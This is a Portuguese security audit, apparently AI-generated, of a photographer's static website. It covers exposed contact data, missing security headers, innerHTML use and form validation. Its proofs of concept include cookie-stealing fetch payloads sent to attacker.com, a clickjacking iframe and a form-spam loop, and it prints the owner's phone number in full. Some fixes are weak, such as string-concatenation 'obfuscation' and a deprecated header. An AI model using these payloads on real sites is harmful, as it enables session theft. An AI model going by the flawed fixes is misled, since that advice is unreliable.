# AUDITORIA DE SEGURANÇA WEB
## FOTOGRAFIA-VINICIUS-SITE
**Data:** 03/05/2026 | **Repositório:** https://github.com/SILENCIDL/FOTOGRAFIA-VINICIUS-SITE

---

## VULNERABILIDADES ENCONTRADAS

### 1. NÚMERO DE TELEFONE WHATSAPP EXPOSTO
**Severidade:** MÉDIA  
**Localização:** `index.html` (múltiplas ocorrências: linhas 256, 273, 292, 309, 597, 625, 642)  
**Arquivo(s):** index.html  

**Descrição:** Número de telefone WhatsApp `5512981771665` hardcoded e visível no código-fonte, DOM e URLs.

**Prova de Conceito:**
```bash
# Extrair telefone do código-fonte
curl https://raw.githubusercontent.com/SILENCIDL/FOTOGRAFIA-VINICIUS-SITE/main/index.html | grep -o "5512981771665"

# Resultado esperado: múltiplas ocorrências expostas
```

**Como Explorar:**
- Scraper automatizado extrai número de contato
- Spam/phishing usando número real do fotógrafo
- Ataques de engenharia social com credibilidade
- Integração com listas de spam

**Como Corrigir:**
```javascript
// Em main.js, centralizar como constante privada (não exposta ao DOM)
const CONTACT = {
  whatsapp: '55' + '1' + '2' + '9' + '8' + '1' + '7' + '7' + '1' + '6' + '6' + '5', // Obfuscado
};

// Função helper para construir URLs
function buildWhatsappUrl(message) {
  const phone = CONTACT.whatsapp;
  return `https://wa.me/${phone}?text=${encodeURIComponent(message)}`;
}

// No HTML, usar data-attributes sem telefone visível
<a href="#" onclick="window.open(buildWhatsappUrl('mensagem'), '_blank'); return false;">
  Solicitar orçamento
</a>
```

---

### 2. EVENT HANDLERS INLINE (onmouseover/onmouseout)
**Severidade:** ALTA  
**Localização:** `index.html`, linhas 689-695  
**Arquivo(s):** index.html

**Descrição:** Uso de atributos de evento HTML inline com manipulação de estilos. Padrão legado que viola Content Security Policy (CSP) e é vetor de XSS.

**Código Vulnerável:**
```html
<button onclick="..." 
        onmouseover="this.style.color='#8B6F47'; this.style.borderColor='#8B6F47';"
        onmouseout="this.style.color='rgba(240,237,230,0.6)'; this.style.borderColor='transparent';">
```

**Prova de Conceito:**
```html
<!-- Injetar evento malicioso se houver XSS em outra parte -->
<button onmouseover="fetch('https://attacker.com/steal?data='+document.cookie)">
```

**Como Corrigir - Usar Event Listeners:**
```javascript
// Em assets/js/main.js
function initButtonHovers() {
  const buttons = document.querySelectorAll('[data-hover-color]');
  buttons.forEach(btn => {
    btn.addEventListener('mouseenter', (e) => {
      e.target.style.color = '#8B6F47';
      e.target.style.borderColor = '#8B6F47';
    });
    btn.addEventListener('mouseleave', (e) => {
      e.target.style.color = 'rgba(240,237,230,0.6)';
      e.target.style.borderColor = 'transparent';
    });
  });
}

// Chamar após DOMContentLoaded
document.addEventListener('DOMContentLoaded', () => {
  app.init();
  initButtonHovers();
});
```

**HTML Corrigido:**
```html
<button onclick="document.getElementById('pre-wedding-section').scrollIntoView({behavior:'smooth'})"
        class="text-xs uppercase tracking-widest pb-1 border-b border-transparent transition-all"
        style="font-family:'DM Mono',monospace; color:rgba(240,237,230,0.6);"
        data-hover-color="true">
  Pre Wedding
</button>
```

---

### 3. FALTA DE CONTENT SECURITY POLICY (CSP)
**Severidade:** ALTA  
**Localização:** Cabeçalho HTTP (não configurado)  
**Arquivo(s):** Requer configuração no servidor/CDN

**Descrição:** Sem CSP, qualquer injeção XSS pode executar scripts arbitrários. O site carrega recursos de terceiros (fonts, CDNs).

**Prova de Conceito:**
```javascript
// Sem CSP, um atacante poderia injetar:
<img src=x onerror="fetch('https://attacker.com/steal?cookies='+document.cookie)">
```

**Como Corrigir - Adicionar Header HTTP:**

**Para GitHub Pages (_config.yml):**
```yaml
# Se usar Jekyll, adicionar custom headers não é suportado nativamente
# Solução: Usar Netlify ou Vercel ao invés do GitHub Pages
```

**Para Netlify (netlify.toml):**
```toml
[[headers]]
  for = "/*"
  [headers.values]
    Content-Security-Policy = "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://fonts.googleapis.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://wa.me; frame-ancestors 'none';"
    X-Content-Type-Options = "nosniff"
    X-Frame-Options = "DENY"
    X-XSS-Protection = "1; mode=block"
    Strict-Transport-Security = "max-age=31536000; includeSubDomains"
    Referrer-Policy = "strict-origin-when-cross-origin"
```

**Para Vercel (vercel.json):**
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com https://cdn.jsdelivr.net https://fonts.googleapis.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://wa.me; frame-ancestors 'none';"
        },
        {
          "key": "X-Content-Type-Options",
          "value": "nosniff"
        },
        {
          "key": "X-Frame-Options",
          "value": "DENY"
        },
        {
          "key": "X-XSS-Protection",
          "value": "1; mode=block"
        },
        {
          "key": "Strict-Transport-Security",
          "value": "max-age=31536000; includeSubDomains"
        },
        {
          "key": "Referrer-Policy",
          "value": "strict-origin-when-cross-origin"
        }
      ]
    }
  ]
}
```

---

### 4. AUSÊNCIA DE X-FRAME-OPTIONS
**Severidade:** ALTA  
**Localização:** Cabeçalho HTTP

**Descrição:** Sem X-Frame-Options, o site pode ser embutido em iframes maliciosos (clickjacking).

**Prova de Conceito:**
```html
<!-- Atacante cria página maliciosa -->
<iframe src="https://fotografia-vinicius.com" 
        style="width:100%; height:100%; position:absolute; opacity:0.0; z-index:999;"></iframe>
<button>Clique aqui para ganhar R$1000</button>
<!-- Vítima clica no botão falso, mas clica no iframe real -->
```

**Como Corrigir:** Adicionar aos headers (ver CSP acima):
```
X-Frame-Options: DENY
```

Ou permitir apenas mesmo domínio:
```
X-Frame-Options: SAMEORIGIN
```

---

### 5. FALTA DE HSTS (HTTP Strict-Transport-Security)
**Severidade:** ALTA  
**Localização:** Cabeçalho HTTP

**Descrição:** Sem HSTS, navegador pode usar HTTP ao invés de HTTPS, permitindo ataques MITM.

**Prova de Conceito:**
```
Cliente acessa http://fotografia-vinicius.com (sem HTTPS)
→ Atacante intercepta tráfego (WiFi aberto, ISP, etc)
→ Roubo de dados, injeção de malware
```

**Como Corrigir:** Adicionar header:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

### 6. INNERHTML COM INTERPOLAÇÃO DE DADOS
**Severidade:** MÉDIA (Risco Potencial)  
**Localização:** `assets/js/gallery.js`, linhas 97-105  
**Arquivo(s):** gallery.js

**Descrição:** Uso de `innerHTML` com template literals. Embora dados sejam hardcoded agora, padrão é vulnerável a XSS se dados forem dinâmicos no futuro.

**Código Vulnerável:**
```javascript
card.innerHTML = `
  <img src="${encodeURI(w.path + 'capa.jpg')}"
       onerror="this.onerror=null; this.src='${w.fallback}'"
       class="w-full h-full object-cover opacity-50 group-hover:opacity-100 transition-all duration-700"
       alt="${w.name}">
  <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent"></div>
  <div class="absolute bottom-4 md:bottom-6 left-4 md:left-6 text-left">
    <h4 class="font-serif text-lg md:text-2xl text-white uppercase tracking-tighter">${w.name}</h4>
  </div>`;
```

**Risco:** Se `w.name` ou `w.fallback` virem de API externa/usuário:
```javascript
// Atacante controla: w.name = 'Test" onerror="alert(1)'
// Resultado: <h4>Test" onerror="alert(1)</h4>
```

**Como Corrigir - Usar textContent:**
```javascript
function _makeWeddingCard(w) {
  const card = document.createElement('div');
  card.className = 'group relative aspect-[4/3] overflow-hidden cursor-pointer bg-stone-900 shadow-xl reveal';
  card.onclick = () => openGallery('wedding-detail', w);

  // Imagem
  const img = document.createElement('img');
  img.src = encodeURI(w.path + 'capa.jpg');
  img.alt = w.name;
  img.className = 'w-full h-full object-cover opacity-50 group-hover:opacity-100 transition-all duration-700';
  img.onerror = function() {
    this.src = w.fallback; // w.fallback é URL validada
  };
  card.appendChild(img);

  // Overlay
  const overlay = document.createElement('div');
  overlay.className = 'absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent';
  card.appendChild(overlay);

  // Conteúdo
  const content = document.createElement('div');
  content.className = 'absolute bottom-4 md:bottom-6 left-4 md:left-6 text-left';
  
  const title = document.createElement('h4');
  title.className = 'font-serif text-lg md:text-2xl text-white uppercase tracking-tighter';
  title.textContent = w.name; // SEGURO: textContent vs innerHTML
  content.appendChild(title);
  
  card.appendChild(content);
  return card;
}
```

---

### 7. VALIDAÇÃO DE FORMULÁRIO INSUFICIENTE
**Severidade:** BAIXA  
**Localização:** `index.html`, linhas 549-603; `assets/js/main.js`, linhas 113-128

**Descrição:** Formulário usa `required` HTML5, mas sem validação backend (não há backend). Entradas vão direto pro WhatsApp via encodeURIComponent(), que é seguro, mas falta:
- Limite de comprimento
- Sanitização de caracteres especiais
- Validação de email (não há campo de email)

**Prova de Conceito:**
```javascript
// Usuário malicioso submete:
nome: "<img src=x onerror=alert(1)>"
// Via form, encodeURIComponent converte para: %3Cimg...
// No WhatsApp, aparece como texto, sem execução (seguro)
// MAS se houver integração com CRM/banco de dados no futuro, risco aumenta
```

**Como Corrigir:**
```javascript
// Em main.js, adicionar validação antes de enviar
initContactForm() {
  const form = document.getElementById('contact-form');
  if (!form) return;
  
  form.addEventListener('submit', e => {
    e.preventDefault();
    
    const nome     = document.getElementById('cf-nome')?.value?.trim() || '';
    const servico  = document.getElementById('cf-servico')?.value     || '';
    const data     = document.getElementById('cf-data')?.value        || '';
    const mensagem = document.getElementById('cf-mensagem')?.value?.trim() || '';
    
    // Validações
    if (!nome || nome.length < 3 || nome.length > 100) {
      alert('Nome inválido (3-100 caracteres)');
      return;
    }
    
    if (mensagem && mensagem.length > 500) {
      alert('Mensagem muito longa (máx 500 caracteres)');
      return;
    }
    
    // Remover caracteres perigosos (caso haja integração backend)
    const sanitize = (str) => str.replace(/[<>]/g, '');
    
    let texto = `Olá Vinícius! Meu nome é ${sanitize(nome)}.`;
    if (servico)  texto += ` Tenho interesse em: ${servico}.`;
    if (data)     texto += ` Data prevista: ${data}.`;
    if (mensagem) texto += ` Mensagem: ${sanitize(mensagem)}`;
    
    window.open(`https://wa.me/5512981771665?text=${encodeURIComponent(texto)}`, '_blank');
  });
},
```

---

### 8. AUSÊNCIA DE RATE LIMITING NO FORMULÁRIO
**Severidade:** BAIXA  
**Localização:** `assets/js/main.js`, linhas 113-128

**Descrição:** Nenhuma proteção contra spam/múltiplos envios rápidos do formulário.

**Prova de Conceito:**
```javascript
// Atacante abre DevTools e executa:
for(let i=0; i<100; i++) {
  document.getElementById('contact-form').dispatchEvent(new Event('submit'));
}
// Resultado: 100 mensagens WhatsApp em segundos
```

**Como Corrigir:**
```javascript
let lastSubmitTime = 0;
const SUBMIT_COOLDOWN = 2000; // 2 segundos

initContactForm() {
  const form = document.getElementById('contact-form');
  if (!form) return;
  
  form.addEventListener('submit', e => {
    e.preventDefault();
    
    const now = Date.now();
    if (now - lastSubmitTime < SUBMIT_COOLDOWN) {
      alert('Aguarde alguns segundos antes de enviar novamente');
      return;
    }
    lastSubmitTime = now;
    
    // ... resto do código
  });
},
```

---

## RESUMO DE SEVERIDADES

| Severidade | Quantidade | Vulnerabilidades |
|-----------|-----------|------------------|
| **CRÍTICA** | 0 | — |
| **ALTA** | 4 | CSP ausente, X-Frame-Options ausente, HSTS ausente, Event handlers inline |
| **MÉDIA** | 2 | Telefone exposto, innerHTML com interpolação |
| **BAIXA** | 2 | Validação insuficiente, Falta rate limiting |

---

## CHECKLIST DE SEGURANÇA

- ❌ Headers de segurança (CSP, X-Frame-Options, HSTS)
- ❌ Proteção contra XSS (event handlers inline, innerHTML)
- ❌ Secrets expostos (número WhatsApp)
- ✅ HTTPS enforced (se deployado em GitHub Pages)
- ✅ CORS não aplicável (site estático)
- ✅ Dependências desatualizadas (npm audit) — N/A (sem dependências externas via npm)
- ⚠️ Validação de inputs (presente mas mínima)
- ❌ Rate limiting

---

## RECOMENDAÇÕES PRIORITÁRIAS

1. **IMEDIATO:** Migrar para Netlify/Vercel e configurar headers HTTP (CSP, HSTS, X-Frame-Options)
2. **IMEDIATO:** Remover event handlers inline e usar JavaScript puro
3. **CURTO PRAZO:** Adicionar rate limiting ao formulário
4. **CURTO PRAZO:** Considerar obfuscação/centralização do número WhatsApp
5. **FUTURO:** Se integrar com CRM/API, implementar validação backend robusta

---

**Status:** ✅ Auditoria Completa  
**Data:** 03/05/2026  
**Auditado por:** Security Analysis Agent
